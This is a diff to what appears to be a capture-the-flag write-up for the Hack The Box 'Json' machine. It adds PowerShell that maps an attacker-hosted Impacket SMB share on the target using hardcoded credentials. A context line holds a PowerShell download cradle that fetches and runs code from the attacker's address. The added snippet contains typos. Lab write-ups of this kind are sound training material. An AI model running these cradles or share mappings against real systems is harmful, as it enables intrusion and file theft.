@@ -40,7 +40,7 @@ root@kali:~# echo -n "IEX(New-Object Net.WebClient).downloadString('http://10.10
 Setting up SMB server
 =====================
 {% highlight bash%}
-root@kali:~/HTB/Json/smb# smbserver.py -username root -password root sharingiscaring $(pwd)
+root@kali:~/HTB/Json/smb# smbserver.py -username root -password password sharingiscaring $(pwd)
 Impacket v0.9.21-dev - Copyright 2019 SecureAuth Corporation
 
 [*] Config file parsed
@@ -50,6 +50,16 @@ Impacket v0.9.21-dev - Copyright 2019 SecureAuth Corporation
 [*] Config file parsed
 [*] Config file parsed
 {% endhighlight %}
+
+On the windows side:
+{% highlight bash%}
+$pass= “password” | ConverTo-SecureString -AsPlainText -Force #need to be typed
+$pass #to verify it is created
+$cred = New-Object System.Management.Automation.PsCredential('root',$pass)
+$cred #to verify it is created
+New-PSDrive -name root -root \\10.10.14.1\sharingiscaring -Credential $cred -PSProvider "filesystem"
+{% endhighlight %}
+
 
 One Liners
 ==========
